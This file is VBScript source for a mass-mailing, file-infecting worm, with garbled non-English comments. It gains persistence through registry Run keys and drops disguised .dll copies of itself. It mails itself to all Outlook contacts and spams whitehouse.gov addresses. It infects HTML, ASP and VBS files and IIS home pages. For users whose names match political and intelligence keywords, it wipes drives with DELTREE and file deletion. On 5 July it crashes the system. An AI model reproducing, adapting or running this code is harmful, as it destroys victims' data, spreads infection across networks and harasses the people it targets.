On Error Resume Next

Dim vbscr, fso, w1, w2, MSWKEY, HCUW, Code_Str, Vbs_Str, Js_Str
Dim defpath, smailc, MAX_SIZE
Dim whb(), title(10)
smailc = 4

ReDim whb(smailc) ���׹������Ա�ʼ�����

whb(0) = "president@whitehouse.gov"
whb(1) = "vice.president@whitehouse.gov "
whb(2) = "first.lady@whitehouse.gov"
whb(3) = "mrs.cheney@whitehouse.gov"
'�����ʼ�������
title(0) = "Thanks for helping me!"
title(1) = "The police are investigating the robbery"
title(2) = "an application for a job "
title(3) = "The aspects of an application process pertinent to OSI"
title(4) = "What a pleasant weather. Why not go out for a walk?"
title(5) = "These countries have gone / been through too many wars"
title(6) = "We've fixed on the 17th of April for the wedding"
title(7) = "The wind failed and the sea returned to calmness."
title(8) = "the sitting is open!"
title(9) = ""
defpath = "C:\Readme.html" ' �����ļ�
MAX_SIZE = 100000 ' ���崫Ⱦ�ļ������ߴ�

MSWKEY = "HKEY_LOCAL_MACHINE\SoftWare\Microsoft\Windows\"
HCUW = "HKEY_CURRENT_USER\Software\Microsoft\WAB\"


main

Sub main() '������
    
    On Error Resume Next
    Dim w_s
    w_s = WScript.ScriptFullName '�õ������ļ������·��
    If w_s = "" Then
        Err.Clear
        Set fso = CreateObject("Scripting.FileSystemObject") '�����ļ�ϵͳ����
        
        If getErr Then '���ϲ���״̬
            Randomize '��ʼ���������
            ra = Int(Rnd() * 7) '���������
            doucment.Write title(ra) ' д�������
            ExecuteMail 'ִ���ʼ�״̬ʱ�ĳ���
        Else
            ExecutePage 'ִ�� WEB ҳ״̬ʱ�ĳ���
        End If
        
    Else
        ExecuteVbs 'ִ�� VBS �ļ�״̬ʱ�ĳ���
    End If
    
End Sub


Function getErr() '���Դ���
    
    If Err.Number<>0 Then
        getErr = True
        Err.Clear
    Else
        getErr = False
    End If
    
End Function



Sub ExecutePage() 'WEB ҳ״̬ʱ�ĳ���
    
    On Error Resume Next
    Dim Html_Str, adi, wdf, wdf2, wdf3, wdsf, wdsf2, vf
    Vbs_Str = GetScriptCode("vbscript") '�õ� VBScript ����
    Js_Str = GetJavaScript() ' �õ� Javascript ����
    Code_Str = MakeScript(encrypt(Vbs_str), True) '�õ��Ѽ��ܹ��Ľű�����
    Html_Str = MakeHtml(encrypt(Vbs_str), True) '�õ��Ѽ��ܵ�����HTML����
    
    Gf
    
    '���岡���ļ���·��
    wdsf = w2 & "Mdm.vbs"
    wdsf2 = w1 & "Profile.vbs"
    wdf = w2 & "user.dll" ' ע�� wdf �� wdf3 �����ļ��ǳ��Ի���
    wdf2 = w2 & "Readme.html"
    wdf3 = w2 & "system.dll"
    '���������ļ�
    Set vf = fso.OpenTextFile (wdf, 2, True)
    vf.Write Vbs_Str
    vf.Close
    
    Set vf = fso.OpenTextFile (wdsf, 2, True)
    vf.Write Vbs_Str
    vf.Close
    
    Set vf = fso.OpenTextFile (wdsf2, 2, True)
    vf.Write Vbs_Str
    vf.Close
    
    Set vf = fso.OpenTextFile (wdf2, 2, True)
    vf.Write Html_Str
    vf.Close
    Set vf = fso.OpenTextFile (wdf3, 2, True)
    vf.Write Code_Str
    vf.Close
    
    
    
    '�޸�ע����ò����ļ���ÿһ�μ���������Զ�ִ��
    Writereg MSWKEY & "CurrentVersion\Run\Mdm", wdsf, ""
    Writereg MSWKEY & "CurrentVersion\RunServices\Profile", wdsf2, ""
    
    SendMail ' ִ�з����ʼ�����
    Hackpage ' ִ�и�Ⱦ��վ����
    
    
    Set adi = fso.Drives
    For Each x in adi
        If x.DrivesType = 2 Or x.DrivesType = 3 Then '�������б���Ӳ�̺����繲��Ӳ��
            Call SearchHTML(x & "\") 'ִ���ļ���Ⱦ����
        End If
        
    Next
    
    If TestUser Then '����û�
        Killhe ִ��ɾ���ļ�����
    Else
        If Month(Date) & Day(Date) = "75" Then '��ϵͳʱ��Ϊ 7��5��
            Set vf = fso.OpenTextFile(w2 & "75.htm", 2, True) ������ϵͳ�����ļ�
            vf.Write MakeScript ("window.navigate ('c:/con/con');", False)
            vf.Close
            Writereg MSWKEY & "CurrentVersion\Run\75", w2 & "75.htm", "" '�Զ�����
            window.navigate "c:/con/con" '�������������� Windows BUG�������� Win9X ϵͳ100%���������޷��ָ���������
        Else '�粻��7.5
            If fso.FileExists(w2 & "75.htm") Then fso.DeleteFile w2 & "75.htm" ' ɾ��75.htm
        End If
    End If
    
    If fso.FileExists(defpath) Then fso.DeleteFile defpath ' ɾ�� C:\Readme.html �����ļ�
    
End Sub






Sub ExecuteMail() '�ʼ�״̬ʱִ�еĳ���
    
    On Error Resume Next
    Vbs_Str = GetScriptCode("vbscript")
    Js_Str = GetJavaScript()
    Set Stl = CreateObject("Scriptlet.TypeLib") '���� TypeLib����
    With Stl
        .Reset
        .Path = defpath
        .Doc = MakeHtml(encrypt(Vbs_str), True)
        .Write() '���� C:\Readme.html �ļ�
    End With
    window.Open defpath, "trap", "width=1 height=1 menubar=no scrollbars=no toolbar=no" �򿪻����صĴ���
End Sub


Sub ExecuteVbs() ' ͬ���粡���ļ��� VBS ʱ��ִ�еĳ���
    
    On Error Resume Next
    Dim x, adi, wvbs, ws, vf
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set wvbs = CreateObject("WScript.Shell")
    
    Gf
    
    wvbs.RegWrite MSWKEY & "Windows Scripting Host\Setings\Timeout", 0, "REG_DWORD"
    Set vf = fso.OpenTextFile (w2 & "system.dll", 1)
    Code_Str = vf.ReadAll()
    vf.Close
    Hackpage
    SendMail
    Set adi = fso.Drives
    For Each x in adi
        If x.DrivesType = 2 Or x.DrivesType = 3 Then
            Call SearchHTML(x & "\")
        End If
    Next
    
    If TestUser Then Killhe
    
End Sub






Sub Gf() '�õ�ϵͳ·��
    
    w1 = fso.GetSpecialFolder(0) & "\"
    w2 = fso.GetSpecialFolder(1) & "\"
    
End Sub



Function Readreg(key_str) '��ע���
    Set tmps = CreateObject("WScript.Shell")
    Readreg = tmps.RegRead(key_str)
    Set tmps = Nothing
End Function


Function Writereg(key_str, Newvalue, vtype) 'дע���
    Set tmps = CreateObject("WScript.Shell")
    If vtype = "" Then
        tmps.RegWrite key_str, Newvalue
    Else
        tmps.RegWrite key_str, Newvalue, vtype
    End If
    Set tmps = Nothing
End Function


Function MakeHtml(Sbuffer, iHTML) '����HTML �ļ�����������
    Dim ra
    Randomize
    ra = Int(Rnd() * 7)
    MakeHtml = "<" & "HTML><" & "HEAD><" & "TITLE>" & title(ra) & "</" & "TITLE><" & "/HEAD>" & _
               "<BO" & "AD>" & vbCrLf & MakeScript(Sbuffer, iHTML) & vbCrLf & _
               "<" & "/BOAD><" & "/HTML>"
End Function



Function MakeScript(Codestr, iHTML) '�˳����ǲ����������Ҽ��ܹ���,��Ϊ���ӣ���������
    
    If iHTML Then
        Dim DocuWrite
        DocuWrite = "document.write('<'+" & "'SCRIPT Language=JavaScript>\n'+" & _
                    "jword" & "+'\n</'" & "+'SCRIPT>');"
        DocuWrite = DocuWrite & vbCrLf & "document.write('<'+" & "'SCRIPT Language=VBScript>\n'+" & _
                    "nword" & "+'\n</'" & "+'SCRIPT>');"
        MakeScript = "<" & "SCRIPT Language=JavaScript>" & vbCrLf & "var jword = " & _
                     Chr(34) & encrypt(Js_Str) & Chr(34) & vbCrLf & "var nword = " & _
                     Chr(34) & Codestr & Chr(34) & vbCrLf & "nword = unescape(nword);" & vbCrLf & _
                     "jword = unescape(jword);" & vbCrLf & DocuWrite & vbCrLf & "</" & "SCRIPT>"
    Else
        MakeScript = "<" & "SCRIPT Language=JavaScript>" & Codestr & "</" & "SCRIPT>"
    End If
End Function


Function GetScriptCode(Languages) ' �õ���ͬ�ű����ԵĴ���
    
    Dim soj
    For Each soj in document.scripts
        If LCase(soj.Language) = Languages Then
            
            If Languages = "javascript" Then
                
                If Len(soj.Text)> 200 Then
                Else
                    GetScriptCode = soj.Text
                    Exit Function
                End If
                
            Else
                GetScriptCode = soj.Text
                Exit Function
            End If
            
        End If
    Next
    
End Function






Function GetJavaScript()
    
    GetJavaScript = GetScriptCode("javascript")
End Function






Function TestUser() '����û�����
    
    On Error Resume Next
    Dim Keys(6), i, tmpStr, Wnet
    '�ض��û��ؼ���
    Keys(0) = "white home"
    Keys(1) = "central intelligence agency"
    Keys(2) = "bush"
    Keys(3) = "american stock exchang"
    Keys(4) = "chief executive"
    Keys(5) = "usa"
    TestUser = False
    Set Wnet = CreateObject("WScript.Network") '�����������
    '����һ��3��ѭ��������һ�����Ǽ���û��� Domain���û����ͼ�������Ƿ������ϵ�5���ؼ����һ�����г��򽫷��ء��桱���������Ӷ�����Щ�û����ļ����з��ɾ����
    
    tmpStr = LCase(Wnet.UserName) '
    For i = 0 To 4
        If InStr(tmpStr, Keys(i)) > 0 Then
            TestUser = True
            Exit Function
        End If
    Next
    tmpStr = LCase(Wnet.ComputerName)
    For i = 0 To 4
        If InStr(tmpStr, Keys(i)) > 0 Then
            TestUser = True
            Exit Function
        End If
    Next
    tmpStr = LCase(Wnet.UserDomain)
    For i = 0 To 4
        If InStr(tmpStr, Keys(i)) >0 Then
            TestUser = True
            Exit Function
        End If
    Next
    Set Wnet = Nothing
End Function



Function SendMail() '�����ļ�����
    
    On Error Resume Next
    Dim wab, ra, j, Oa, arrsm, eins, Eaec, fm, wreg, areg, at
    '������ OutLook ��ַ�����ʹ���ֱ�Ӹ�Ⱦ�ļ����Ѽ��ܵĲ��������HTML ����
    ����������ģ��˹����롰����ʱ�⡰���ƣ����Բ�������
    Randomize
    at = fso.GetSpecialFolder(1) & "\Readme.html"
    Set Oa = CreateObject("Outlook.Application")
    Set wab = Oa.GetNameSpace("MAPI")
    For j = 1 To wab.AddressLists.Count
        eins = wab.AddressLists(j)
        wreg = Readreg (HCUW & eins)
        If (wreg = "") Then wreg = 1
        Eaec = eins.AddressEntries.Count
        If (Eaec > Int(wreg)) Then
            For x = 1 To Eaec
                arrsm = wab.AddressEntries(x)
                areg = Readreg(HCUW & arrsm)
                If (areg = "") Then
                    Set fm = wab.CreateItem(0)
                    With fm
                        ra = Int(Rnd() * 7)
                        .Recipients.Add arrsm
                        .Subject = title(ra)
                        .Body = title(ra)
                        .Attachments at
                        .Send
                        Writereg HCUW & arrsm, 1, "REG_DWORD"
                    End With
                End If
            Next
        End If
        Writereg HCUW & eins, Eaec, ""
    Next
    '�����Ƕ�ָ�����û����������ʹ��������ʼ�, ����һ��ɿ����������߶����������ļ��Ȳ�����
    For j = 1 To smailc
        arrsm = whb(j)
        Set fm = wab.CreateItem(0)
        ra = Int(Rnd() * 7)
        With fm
            .Recipients.Add arrsm
            .Subject = title(ra)
            .Body = title(ra)
            .Send
        End With
    Next
    Set Oa = Nothing
    window.setTimeout "SendMail()", 5000 'ÿ�� 5 �����ظ�����
End Function


Sub SearchHTML(Path) '�����ɴ�Ⱦ�ļ��Ĺ���
    On Error Resume Next
    Dim pfo, psfo, pf, ps, pfi, ext
    If InStr(Path, fso.GetSpecialFolder(2)) > 0 Then Exit Sub
    If Path <> "E:\" Then Exit Sub
    Set pfo = fso.GetFolder(Path)
    Set psfo = pfo.SubFolders
    For Each ps in psfo
        SearchHTML(ps.Path)
        Set pf = ps.Files
        For Each pfi in pf
            ext = LCase(fso.GetExtensionName(pfi.Path))
            If InStr(ext, "htm") > 0 Or ext = "plg" Or ext = "asp" Then '����ļ�����չ���Ƿ�Ϊ htm��html��plg ���������Ƿ񱻸�Ⱦ����δ����Ⱦ���Ѽ��ܵĲ�����������ļ�ͷ�������ļ�һ��ִ��Ҳ��ִ�в������룬���Ҳ���Ӱ��ԭ�ļ�������ִ�С�
                If Code_Str<>"" Then AddHead pfi.Path, pfi, 1
            ElseIf ext = "vbs" Then '���� vbs �ļ��������δ���ܵĲ�������
                AddHead pfi.Path, pfi, 2
            End If
        Next
    Next
End Sub






Sub Killhe() 'ȫ��ɾ���ļ�����
    
    On Error Resume Next
    Dim codeText, ko, adi, kd, kh, ks, kf, kfs
    codeText = "@ECHO OFF" & vbCrLf & "PATH " & w1 & "COMMAND" & vbCrLf &_
    "DELTREE c:\" '��ɾ��C�̵��������Autoexec.bat �У��´ο���ʱ��ɾ������Ӳ�̣���û���κ���ʾ
    Set ko = fso.OpenTextFile("C:\Autoexec.bat", 8, True)
    ko.Write vbCrLf & codeText
    ko.Close
    '��������ɾ�������̵������ļ�
    Set adi = fso.Drives
    For Each x in adi
        If x.DrivesType = 2 Then
            Set kd = fso.GetFolder(x & "\")
            Set kfs = kd.Files
            For Each kf in kfs
                kf.Delete
            Next
            Set ks = kd.SubFolders
            For Each kh in ks
                kh.Delete
            Next
        End If
    Next
    
    Do While 1 '��ϵͳ��������
        window.Open ""
    Loop
End Sub

Sub Hackpage() ' �˹�����ֱ�ӹ��� Mircosoft IIS ��������ҳ����
    
    Dim fi
    H = "C:\InetPut\wwwroot"
    If fso.FolderExists(H) Then
        '�ж��Ƿ�Ϊ��վ���������Ѽ��ܵĴ�������������ļ�ͷ���Ӷ�ֱ�Ӵ�Ⱦ�������վ���û�
        Set fi = fso.GetFile(H & "\index.htm")
        AddHead H & "\index.htm", fi, 1
    End If
    
End Sub

Sub AddHead(Path, f, t) '�˹����ǲ�����Ⱦ�ļ��������
    
    On Error Resume Next
    Dim tso, buffer, sr
    If f.Size > MAX_SIZE Then Exit Sub '��Ⱦ��СС��100K���ļ�
    Set tso = fso.OpenTextFile(Path, 1, True)
    buffer = tso.ReadAll()
    tso.Close
    If (t = 1) Then
        
        If UCase(Left(LTrim(buffer), 7)) <> "<SCRIPT" Then
            
            Set tso = fso.OpenTextFile(Path, 2, True)
            tso.Write Code_Str & vbCrLf & buffer '���뵽�ļ�ͷ
            tso.Close
            
        End If
    Else
        If Mid(buffer, 3, 2) <> "'@" Then
            
            tso.Close
            sr = w2 & "user.dll"
            If fso.FileExists(sr) Then fso.CopyFile sr, Path
        End If
    End If
End If

End Sub
